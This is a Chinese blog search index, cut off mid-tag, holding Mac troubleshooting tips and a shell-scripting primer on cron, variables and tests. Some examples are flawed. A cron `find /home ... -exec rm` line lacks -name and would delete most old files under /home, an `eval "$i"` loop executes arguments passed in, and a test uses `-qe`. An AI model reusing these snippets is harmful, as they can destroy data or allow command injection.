<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Mac常见问题解决方案</title>
      <link href="/2021/08/13/yuque/licag6/"/>
      <url>/2021/08/13/yuque/licag6/</url>
      
        <content type="html"><![CDATA[<h2 id="1-卸载-Xcode-后导致一些指令无法正常使用"><a href="#1-卸载-Xcode-后导致一些指令无法正常使用" class="headerlink" title="1.卸载 Xcode 后导致一些指令无法正常使用"></a>1.卸载 Xcode 后导致一些指令无法正常使用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#错误提示: xcrun: error: invalid active developer path (/Applications/Xcode.app/Contents/Developer),</span><span class="token comment">#这种情况可以通过xcode-select --switch指定一个xcode安装路径，</span><span class="token comment">#如果不想安装xcode,那么可以通过重置系统默认开发工具路径.</span><span class="token comment">#通过xcode-select命令来重置系统默认的CommandLineTools路径，如下:</span><span class="token function">sudo</span> xcode-select -r<span class="token function">sudo</span> xcode-select --switch /Library/Developer/CommandLineTools<span class="token comment">#上面这一步如果提示错误就去 https://developer.apple.com/download/more/ 下载最新的CommandLineTools安装后再重试一下.</span><span class="token function">sudo</span> xcode-select -p<span class="token comment">#安装xcode(用不到的没必要安装,使用上面方案解决即可,需要16G空间)</span><span class="token function">sudo</span> xcode-select --install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-更新系统时间-不生效解决方案"><a href="#2-更新系统时间-不生效解决方案" class="headerlink" title="2.更新系统时间(不生效解决方案)"></a>2.更新系统时间(不生效解决方案)</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#修改时间 2021年8月9日12时1分 (月日时分年)</span><span class="token function">sudo</span> <span class="token function">date</span> 080912012021<span class="token comment">#apple time官网协议:time.apple.com</span><span class="token comment">#阿里协议1:ntp.aliyun.com</span><span class="token comment">#阿里协议2:182.92.12.11</span><span class="token comment">#MacOS 10.14以上的版本</span><span class="token comment">#一次性设置</span><span class="token function">sudo</span> sntp -sS ntp.aliyun.com<span class="token comment">#永久设置</span><span class="token function">sudo</span> systemsetup -setnetworktimeserver ntp.aliyun.com<span class="token function">sudo</span> systemsetup -setusingnetworktime on<span class="token comment">#MacOS 10.14以下的版本</span><span class="token function">sudo</span> ntpdate -vu time.apple.com<span class="token comment">#我这边11.5.2版本的系统不知为撒,执行`sudo sntp -sS ntp.aliyun.com`后并没有更新时间,</span><span class="token comment">#后来发现在设置中关开自动更新时间功能后会更新时间,</span><span class="token comment">#所以通过`sudo systemsetup -setusingnetworktime on &amp;&amp; sudo systemsetup -setusingnetworktime off`解决了更新时间的问题.</span><span class="token comment">#系统时间对照  https://time.is/zh/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>shell 基础知识</title>
      <link href="/2021/07/31/yuque/px53g0/"/>
      <url>/2021/07/31/yuque/px53g0/</url>
      
        <content type="html"><![CDATA[<p>注:文章内容来源于网络,如有侵权请联系我.</p><h2 id="编写脚本注意事项"><a href="#编写脚本注意事项" class="headerlink" title="编写脚本注意事项"></a>编写脚本注意事项</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.开头指定使用什么shell，例如：bash，ksh，csh等<span class="token number">2</span>.脚本功能描述，使用方法，作者，版本，日期等<span class="token number">3</span>.变量名，函数名要有实际意义，函数名以动名词形式，第二个单词首字母要大写。例如：updateConfig<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">4</span>.缩进统一用4个空格，不用TAB<span class="token number">5</span>.取变量值使用大括号，如<span class="token variable">${varname}</span><span class="token number">6</span>.删除文件时，如果路径有变量的，要判断变量有值，如rm -f <span class="token variable">${abc}</span>/* 如果变量abc没有值，则会把根目录下的文件删除<span class="token number">7</span>.脚本中尽量不要使用cd变换目录<span class="token number">8</span>.函数中也要有功能描述，使用依法，版本，日期等<span class="token number">9</span>.函数的功能要单一，不要太复杂<span class="token number">10</span>.<span class="token punctuation">$(</span><span class="token punctuation">)</span>比<span class="token variable"><span class="token variable">`</span> <span class="token variable">`</span></span>更好<span class="token number">11</span>.尽量不要使用多层if语句，而应该以case语句替代<span class="token number">12</span>.如果需要执行确定次数的循环，应该用for语句替代while语句<span class="token number">13</span>.输入的参数要有正确性判断<span class="token number">14</span>.多加注释，方便自己或他人阅读。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="问题汇总"><a href="#问题汇总" class="headerlink" title="问题汇总"></a>问题汇总</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#如果要在shell中使用alias定义快捷指令,需要在alias指令前先执行 `shopt -s expand_aliases` 开启alias扩展功能的交互模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#写入字符串到指定文件中(自动从新的一行写入,不用考虑换行问题)</span><span class="token builtin class-name">echo</span> <span class="token string">'#!/bin/sh'</span> <span class="token operator">&gt;&gt;</span> ~/.bash_profile<span class="token comment">#发送邮件</span>mail  -s <span class="token string">"fail  backup from test"</span> serenitysir@outlook.com <span class="token operator">&lt;</span> error.log<span class="token comment">#获取格式化时间</span><span class="token assign-left variable">today</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">date</span>  -d yesterday +%y%m%d<span class="token variable">`</span></span><span class="token comment">###定时任务cron</span><span class="token function">crontab</span> <span class="token comment">#查看已经配置的定时任务</span><span class="token comment">#f1 f2 f3 f4 f5 program</span><span class="token comment">#其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。</span><span class="token comment">#当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推</span><span class="token comment">#当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推</span><span class="token comment">#当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推</span><span class="token comment">#当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推</span><span class="token comment">#例如:每一分钟执行一次 /bin/ls：</span>* * * * * /bin/ls<span class="token comment">#在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 /usr/bin/backup：</span><span class="token number">0</span> <span class="token number">6</span>-12/3 * <span class="token number">12</span> * /usr/bin/backup<span class="token comment">#周一到周五每天下午 5:00 寄一封信给 alex@domain.name：</span><span class="token number">0</span> <span class="token number">17</span> * * <span class="token number">1</span>-5 mail -s <span class="token string">"hi"</span> alex@domain.name <span class="token operator">&lt;</span> /tmp/maildata<span class="token comment">#每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分....执行 echo "haha"：</span><span class="token number">20</span> <span class="token number">0</span>-23/2 * * * <span class="token builtin class-name">echo</span> <span class="token string">"haha"</span><span class="token number">0</span> */2 * * * /sbin/service httpd restart  <span class="token comment">#意思是每两个小时重启一次apache</span><span class="token number">50</span> <span class="token number">7</span> * * * /sbin/service sshd start  <span class="token comment">#意思是每天7：50开启ssh服务</span><span class="token number">50</span> <span class="token number">22</span> * * * /sbin/service sshd stop  <span class="token comment">#意思是每天22：50关闭ssh服务</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">1,15</span> * * <span class="token function">fsck</span> /home  <span class="token comment">#每月1号和15号检查/home 磁盘</span><span class="token number">1</span> * * * * /home/bruce/backup  <span class="token comment">#每小时的第一分执行 /home/bruce/backup这个文件</span>00 03 * * <span class="token number">1</span>-5 <span class="token function">find</span> /home <span class="token string">"*.xxx"</span> -mtime +4 -exec <span class="token function">rm</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>  <span class="token comment">#每周一至周五3点钟，在目录/home中，查找文件名为*.xxx的文件，并删除4天前的文件。</span><span class="token number">30</span> <span class="token number">6</span> */10 * * <span class="token function">ls</span>  <span class="token comment">#意思是每月的1、11、21、31日是的6：30执行一次ls命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-内置变量"><a href="#2-内置变量" class="headerlink" title="2.内置变量"></a>2.内置变量</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$$</span> <span class="token comment">#Shell本身的PID（ProcessID）</span><span class="token variable">$!</span> <span class="token comment">#Shell最后运行的后台Process的PID</span><span class="token variable">$?</span> <span class="token comment">#最后运行的命令的退出状态(如 0:执行成功,1:执行失败...,具体根据程序定义为准) 或 函数返回值</span>$- <span class="token comment">#使用Set命令设定的Flag一览</span><span class="token comment">#$-记录着当前设置的shell选项，himBH是默认值，5个字母分别有各自含义。解释如下：</span><span class="token comment">#h：hashall，打开这个选项后，Shell 会将命令所在的路径记录下来，避免每次都要查询。举例：当h选项开启时，如果将某个自定义命令从/usr/bin/目录下移动到/usr/local/bin/，再运行，会提示无此命令。而当通过set +h将h选项关闭后，上述情况就不会出现。</span><span class="token comment">#i：interactive-comments，包含这个选项说明当前的 shell 是一个交互式的 shell。所谓的交互式shell，就是输入命令后，shell解释执行，然后返回一个结果。在脚本中，i选项是关闭的。</span><span class="token comment">#m：monitor，打开监控模式，就可以通过Job control来控制进程的停止、继续，后台或者前台执行等。</span><span class="token comment">#B：braceexpand，大括号扩展。如果关闭B选项，那么shell就不会将大括号扩展。</span><span class="token comment">#H：history，Shell 会把我们执行的命令记录下来，可以通过 history 命令查看，每一行是序号 + 执行的命令，在 shell 退出时，会将这些信息保存到~/.bash_history 文件中。如果H选项打开，就可以展开历史列表中的命令，可以通过!感叹号来完成，例如"!!"返回上最近的一个历史命令，"!n"返回第 n 个历史命令，等等。</span><span class="token variable">$*</span> <span class="token comment">#所有参数列表。如"$*"用「"」括起来的情况、以"$1 $2 … $n"的形式输出所有参数。</span><span class="token variable">$@</span> <span class="token comment">#所有参数列表。如"$@"用「"」括起来的情况、以"$1" "$2" … "$n" 的形式输出所有参数。</span><span class="token variable">$#</span> 添加到Shell的参数个数<span class="token variable">$0</span> Shell本身的文件名<span class="token variable">$1</span> ～ <span class="token variable">$n</span> <span class="token comment">#添加到Shell的各参数值。$1是第1参数、$2是第2参数…。</span><span class="token comment">#例:</span><span class="token comment">##1.参数传递到子shell</span>$ <span class="token function">vi</span> ./shell1.sh./child_shell.sh <span class="token variable">$@</span>$ ./shell1.sh aa bb cc <span class="token comment">#aa bb cc 将会传递到子shell中</span><span class="token comment">##2.变量赋值</span><span class="token comment"># 从参数给变量赋值</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token string">"<span class="token variable">$@</span>"</span><span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$i</span> <span class="token operator">=</span> *<span class="token string">"="</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>        <span class="token builtin class-name">eval</span> <span class="token string">"<span class="token variable">$i</span>"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-条件判断"><a href="#3-条件判断" class="headerlink" title="3.条件判断"></a>3.条件判断</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#if的基本语法:</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token builtin class-name">command</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>   符合该条件执行的语句<span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token builtin class-name">command</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>   符合该条件执行的语句<span class="token keyword">else</span>   符合该条件执行的语句<span class="token keyword">fi</span><span class="token comment">###注意：</span><span class="token comment">#1、[ ]表示条件测试。注意这里的空格很重要。要注意在'['后面和']'前面都必须要有空格</span><span class="token comment">#2、在shell中，then和fi是分开的语句。如果要在同一行里面输入，则需要用分号将他们隔开。</span><span class="token comment">#3、注意if判断中对于变量的处理，需要加引号，以免一些不必要的错误。没有加双引号会在一些含空格等的字符串变量判断的时候产生错误。比如[ -n "$var" ]如果var为空会出错</span><span class="token comment">#4、判断是不支持浮点值的</span><span class="token comment">#5、如果只单独使用&gt;或者&lt;号，系统会认为是输出或者输入重定向，虽然结果显示正确，但是其实是错误的，因此要对这些符号进行转意</span><span class="token comment">#6、在默认中，运行if语句中的命令所产生的错误信息仍然出现在脚本的输出结果中</span><span class="token comment">#7、使用-z或者-n来检查长度的时候，没有定义的变量也为0</span><span class="token comment">#8、空变量和没有初始化的变量可能会对shell脚本测试产生灾难性的影响，因此在不确定变量的内容的时候，在测试号前使用-n或者-z测试一下</span><span class="token comment">#9、? 变量包含了之前执行命令的退出状态（最近完成的前台进程）（可以用于检测退出状态）</span><span class="token comment">###二、文件/文件夹(目录)判断</span><span class="token comment">#常用的：</span><span class="token punctuation">[</span> -a FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在则为真。</span><span class="token punctuation">[</span> -d FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是一个目录则返回为真。</span><span class="token punctuation">[</span> -e FILE <span class="token punctuation">]</span> <span class="token comment">#如果 指定的文件或目录存在时返回为真。</span><span class="token punctuation">[</span> -f FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是一个普通文件则返回为真。</span><span class="token punctuation">[</span> -r FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是可读的则返回为真。</span><span class="token punctuation">[</span> -w FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是可写的则返回为真。（一个目录为了它的内容被访问必然是可执行的）</span><span class="token punctuation">[</span> -x FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是可执行的则返回为真。</span><span class="token comment">#不常用的：</span><span class="token punctuation">[</span> -b FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是一个块文件则返回为真。</span><span class="token punctuation">[</span> -c FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是一个字符文件则返回为真。</span><span class="token punctuation">[</span> -g FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且设置了SGID则返回为真。</span><span class="token punctuation">[</span> -h FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是一个符号符号链接文件则返回为真。（该选项在一些老系统上无效）</span><span class="token punctuation">[</span> -k FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且已经设置了冒险位则返回为真。</span><span class="token punctuation">[</span> -p FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存并且是命令管道时返回为真。</span><span class="token punctuation">[</span> -s FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且大小非0时为真则返回为真。</span><span class="token punctuation">[</span> -u FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且设置了SUID位时返回为真。</span><span class="token punctuation">[</span> -O FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且属有效用户ID则返回为真。</span><span class="token punctuation">[</span> -G FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且默认组为当前组则返回为真。（只检查系统默认组）</span><span class="token punctuation">[</span> -L FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是一个符号连接则返回为真。</span><span class="token punctuation">[</span> -N FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且自上次读取以来已被修改则返回为真。</span><span class="token punctuation">[</span> -S FILE <span class="token punctuation">]</span> <span class="token comment">#如果 FILE 存在且是一个套接字则返回为真。</span><span class="token punctuation">[</span> FILE1 -nt FILE2 <span class="token punctuation">]</span> <span class="token comment">#如果 FILE1 比 FILE2 新, 或者 FILE1 存在但是 FILE2 不存在则返回为真。</span><span class="token punctuation">[</span> FILE1 -ot FILE2 <span class="token punctuation">]</span> <span class="token comment">#如果 FILE1 比 FILE2 老, 或者 FILE2 存在但是 FILE1 不存在则返回为真。</span><span class="token punctuation">[</span> FILE1 -ef FILE2 <span class="token punctuation">]</span> <span class="token comment">#如果 FILE1 和 FILE2 指向相同的设备和节点号则返回为真。</span><span class="token comment">###字符串判断</span><span class="token punctuation">[</span> -z STRING <span class="token punctuation">]</span> <span class="token comment">#如果STRING的长度为零则返回为真，即空是真</span><span class="token punctuation">[</span> -n STRING <span class="token punctuation">]</span> <span class="token comment">#如果STRING的长度非零则返回为真，即非空是真</span><span class="token punctuation">[</span> STRING1 <span class="token punctuation">]</span>　 <span class="token comment">#如果字符串不为空则返回为真,与-n类似</span><span class="token punctuation">[</span> STRING1 <span class="token operator">==</span> STRING2 <span class="token punctuation">]</span> <span class="token comment">#如果两个字符串相同则返回为真</span><span class="token punctuation">[</span> STRING1 <span class="token operator">!=</span> STRING2 <span class="token punctuation">]</span> <span class="token comment">#如果字符串不相同则返回为真</span><span class="token punctuation">[</span> STRING1 <span class="token operator">&lt;</span> STRING2 <span class="token punctuation">]</span> <span class="token comment">#如果 “STRING1”字典排序在“STRING2”前面则返回为真。</span><span class="token punctuation">[</span> STRING1 <span class="token operator">&gt;</span> STRING2 <span class="token punctuation">]</span> <span class="token comment">#如果 “STRING1”字典排序在“STRING2”后面则返回为真。</span><span class="token comment">###数值判断</span><span class="token punctuation">[</span> INT1 -eq INT2 <span class="token punctuation">]</span> <span class="token comment">#INT1和INT2两数相等返回为真 =</span><span class="token punctuation">[</span> INT1 -ne INT2 <span class="token punctuation">]</span> <span class="token comment">#INT1和INT2两数不等返回为真 &lt;&gt;</span><span class="token punctuation">[</span> INT1 -gt INT2 <span class="token punctuation">]</span> <span class="token comment">#INT1大于INT2返回为真 &gt;</span><span class="token punctuation">[</span> INT1 -ge INT2 <span class="token punctuation">]</span> <span class="token comment">#INT1大于等于INT2返回为真 &gt;=</span><span class="token punctuation">[</span> INT1 -lt INT2 <span class="token punctuation">]</span> <span class="token comment">#INT1小于INT2返回为真 &lt;</span><span class="token punctuation">[</span> INT1 -le INT2 <span class="token punctuation">]</span> <span class="token comment">#INT1小于等于INT2返回为真 &lt;=</span><span class="token comment">###逻辑判断</span><span class="token punctuation">[</span> <span class="token operator">!</span> EXPR <span class="token punctuation">]</span> <span class="token comment">#逻辑非，如果 EXPR 是false则返回为真。</span><span class="token punctuation">[</span> EXPR1 -a EXPR2 <span class="token punctuation">]</span> <span class="token comment">#逻辑与，如果 EXPR1 and EXPR2 全真则返回为真。</span><span class="token punctuation">[</span> EXPR1 -o EXPR2 <span class="token punctuation">]</span> <span class="token comment">#逻辑或，如果 EXPR1 或者 EXPR2 为真则返回为真。</span><span class="token punctuation">[</span> <span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token punctuation">]</span> <span class="token comment">#用OR来合并两个条件</span><span class="token punctuation">[</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token punctuation">]</span> <span class="token comment">#用AND来合并两个条件</span><span class="token comment">###其他判断</span><span class="token punctuation">[</span> -t FD <span class="token punctuation">]</span> <span class="token comment">#如果文件描述符 FD （默认值为1）打开且指向一个终端则返回为真</span><span class="token punctuation">[</span> -o optionname <span class="token punctuation">]</span> <span class="token comment">#如果shell选项optionname开启则返回为真</span><span class="token comment">###高级特性：</span><span class="token comment">##1.双圆括号(( ))：表示数学表达式</span><span class="token comment">#在判断命令中只允许在比较中进行简单的算术操作，而双圆括号提供更多的数学符号，而且在双圆括号里面的'&gt;','&lt;'号不需要转意。</span><span class="token comment">##2.双方括号[[ ]]：表示高级字符串处理函数</span><span class="token comment">#双方括号中判断命令使用标准的字符串比较，还可以使用匹配模式，从而定义与字符串相匹配的正则表达式。</span><span class="token comment">#双括号的作用：</span><span class="token comment">#在shell中，[ $a != 1 || $b = 2 ]是不允许出，要用[ $a != 1 ] || [ $b = 2 ]，而双括号就可以解决这个问题的，</span><span class="token comment">#[[ $a != 1 || $b = 2 ]]。又比如这个[ "$a" -lt "$b" ]，也可以改成双括号的形式(("$a" &lt; "$b"))</span><span class="token comment">###例:</span><span class="token comment">##1.判断文件中是否包含指定字符</span><span class="token comment">#grep -c "dfimage" ~/.bash_profile 得到的是包含的个数</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> -c <span class="token string">"test"</span> ~/.bash_profile<span class="token variable">`</span></span> -qe <span class="token string">'0'</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">'不包含'</span><span class="token keyword">fi</span><span class="token comment">##2.判断目录$doiido是否存在，若不存在，则新建一个</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -d <span class="token string">"<span class="token variable">$doiido</span>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>　　<span class="token function">mkdir</span> <span class="token string">"<span class="token variable">$doiido</span>"</span><span class="token keyword">fi</span><span class="token comment">##3.判断普通文件$doiido是否存(! 判断结果取反)，若不存在，则新建一个</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -f <span class="token string">"<span class="token variable">$doiido</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>　　<span class="token function">touch</span> <span class="token string">"<span class="token variable">$doiido</span>"</span><span class="token keyword">fi</span><span class="token comment">##4.判断$doiido是否存在并且是否具有可执行权限</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -x <span class="token string">"<span class="token variable">$doiido</span>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>　　<span class="token function">mkdir</span> <span class="token string">"<span class="token variable">$doiido</span>"</span><span class="token function">chmod</span> +x <span class="token string">"<span class="token variable">$doiido</span>"</span><span class="token keyword">fi</span><span class="token comment">##5.是判断变量$doiido是否有值</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -n <span class="token string">"<span class="token variable">$doiido</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>　　<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$doiido</span> is empty"</span>　　<span class="token builtin class-name">exit</span> <span class="token number">0</span><span class="token keyword">fi</span><span class="token comment">##6.两个变量判断是否相等</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$var1</span>"</span> <span class="token operator">=</span> <span class="token string">"<span class="token variable">$var2</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>　　<span class="token builtin class-name">echo</span> <span class="token string">'$var1 eq $var2'</span><span class="token keyword">else</span>　　<span class="token builtin class-name">echo</span> <span class="token string">'$var1 not eq $var2'</span><span class="token keyword">fi</span><span class="token comment">##7.测试退出状态：</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> -eq <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">'That is ok'</span><span class="token keyword">fi</span><span class="token comment">##8.数值的比较：</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$num</span>"</span> -gt <span class="token string">"150"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>   <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$num</span> is biger than 150"</span><span class="token keyword">fi</span><span class="token comment">##9.a&gt;b且a&lt;c</span><span class="token comment">#1). (( a &gt; b )) &amp;&amp; (( a &lt; c ))</span><span class="token comment">#2). [[ $a &gt; $b ]] &amp;&amp; [[ $a &lt; $c ]]</span><span class="token comment">#3). [ $a -gt $b -a $a -lt $c ]</span><span class="token comment">##10.a&gt;b或a&lt;c</span><span class="token comment">#1). (( a &gt; b )) || (( a &lt; c ))</span><span class="token comment">#2). [[ $a &gt; $b ]] || [[ $a &lt; $c ]]</span><span class="token comment">#3). [ $a -gt $b -o $a -lt $c ]</span><span class="token comment">##11.检测执行脚本的用户</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span>"</span> <span class="token operator">!=</span> <span class="token string">'root'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>   <span class="token builtin class-name">echo</span>  <span class="token string">"You  have no permission to run <span class="token variable">$0</span> as non-root user."</span>   <span class="token builtin class-name">exit</span>  <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">fi</span><span class="token comment">#上面的语句也可以使用以下的精简语句</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span>"</span> <span class="token operator">!=</span> <span class="token string">'root'</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token builtin class-name">echo</span> <span class="token string">"You have no permission to run <span class="token variable">$0</span> as non-root user."</span><span class="token punctuation">;</span> <span class="token builtin class-name">exit</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token comment">##12.正则表达式</span><span class="token assign-left variable">doiido</span><span class="token operator">=</span><span class="token string">"hero"</span><span class="token keyword">if</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$doiido</span>"</span> <span class="token operator">==</span> h* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"hello，hero"</span><span class="token keyword">fi</span><span class="token comment">##13.查看当前操作系统类型</span><span class="token comment">#!/bin/sh</span><span class="token assign-left variable">SYSTEM</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">uname</span>  -s<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$SYSTEM</span> <span class="token operator">=</span> <span class="token string">"Linux"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>   <span class="token builtin class-name">echo</span> <span class="token string">"Linux"</span><span class="token keyword">elif</span>    <span class="token punctuation">[</span> <span class="token variable">$SYSTEM</span> <span class="token operator">=</span> <span class="token string">"FreeBSD"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>   <span class="token builtin class-name">echo</span> <span class="token string">"FreeBSD"</span><span class="token keyword">elif</span>    <span class="token punctuation">[</span> <span class="token variable">$SYSTEM</span> <span class="token operator">=</span> <span class="token string">"Solaris"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Solaris"</span><span class="token keyword">else</span>    <span class="token builtin class-name">echo</span>  <span class="token string">"What?"</span><span class="token keyword">fi</span><span class="token comment">##14.if利用read传参判断</span><span class="token comment">#!/bin/bash</span><span class="token builtin class-name">read</span> -p <span class="token string">"please  input a score:"</span>  score<span class="token builtin class-name">echo</span>  -e <span class="token string">"your  score [<span class="token variable">$score</span>] is judging by sys now"</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$score</span>"</span> -ge <span class="token string">"0"</span> <span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$score</span>"</span> -lt <span class="token string">"60"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    <span class="token builtin class-name">echo</span>  <span class="token string">"sorry,you  are lost!"</span><span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$score</span>"</span> -ge <span class="token string">"60"</span> <span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$score</span>"</span> -lt <span class="token string">"85"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"just  soso!"</span><span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$score</span>"</span> -le <span class="token string">"100"</span> <span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$score</span>"</span> -ge <span class="token string">"85"</span> <span class="token 